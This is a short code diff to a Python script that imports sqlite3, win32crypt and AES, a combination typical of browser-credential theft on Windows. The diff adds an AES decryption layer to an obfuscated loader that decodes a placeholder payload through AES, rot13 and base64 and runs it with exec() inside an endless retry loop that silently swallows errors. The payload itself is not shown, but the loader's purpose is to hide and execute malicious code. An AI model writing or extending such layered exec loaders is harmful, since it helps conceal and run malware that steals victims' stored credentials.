@@ -18,10 +18,23 @@ import sqlite3
 import json
 import win32crypt
 from Cryptodome.Cipher import AES
+from Cryptodome.Random import get_random_bytes
+from Cryptodome.Protocol.KDF import PBKDF2
+from Cryptodome.Util.Padding import pad, unpad
+
+def decrypt_code(encrypted_text, key):
+    encrypted_bytes = base64.b64decode(encrypted_text)
+    iv = encrypted_bytes[:AES.block_size]
+    ciphertext = encrypted_bytes[AES.block_size:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_bytes = unpad(cipher.decrypt(ciphertext), AES.block_size)
+    return decrypted_bytes.decode()
 
 while True:
     try:
         secert = "<BYPASS>"
+        secretkey = "<BYPASS_KEY>"
+        secert = decrypt_code(secert, base64.b64decode(secretkey))
         unsecret = codecs.encode(secert, 'rot13')
         exec(base64.b64decode({2:str, 3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]](unsecret)))
     except:
